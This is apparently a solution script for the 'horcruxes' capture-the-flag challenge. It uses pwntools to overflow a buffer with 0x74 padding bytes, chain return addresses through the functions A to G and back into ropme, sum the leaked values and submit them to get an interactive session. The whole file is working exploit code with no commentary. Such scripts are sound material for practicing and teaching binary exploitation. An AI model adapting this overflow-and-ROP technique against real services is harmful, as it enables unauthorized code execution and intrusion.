from pwn import *

context.log_level = 'debug'

elf = ELF('./horcruxes')
fd = remote('0', 9032)
raw_input()

fd.recv()
fd.sendline("1")
fd.recvuntil(': ')
pay = "A"*0x74 + "BBBB"
pay += p32(elf.sym.A)
pay += p32(elf.sym.B)
pay += p32(elf.sym.C)
pay += p32(elf.sym.D)
pay += p32(elf.sym.E)
pay += p32(elf.sym.F)
pay += p32(elf.sym.G)
pay += p32(0x809FFFC) # call ropme

fd.sendline(pay)
sum = 0

for i in range (7):
        fd.recvuntil("+")
        sum += int(fd.recvuntil(")", drop = True))
        log.info(sum)


fd.sendline("1")
fd.recvuntil(': ')
fd.sendline(str(sum))
fd.recv()
fd.interactive()

